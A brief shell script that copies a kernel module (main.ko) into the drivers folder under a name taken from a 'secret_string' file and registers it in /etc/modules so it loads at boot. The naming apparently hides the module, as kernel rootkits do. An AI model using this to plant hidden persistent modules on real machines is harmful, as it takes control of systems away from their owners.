# This script copies the module to the drivers folder and adds it as a startup module

export SECRET_STRING=$(cat secret_string)

cp -f main.ko "/lib/modules/$(uname -r)/kernel/drivers/$SECRET_STRING.ko"
echo "\n$SECRET_STRING #magic\n" >> /etc/modules
depmod
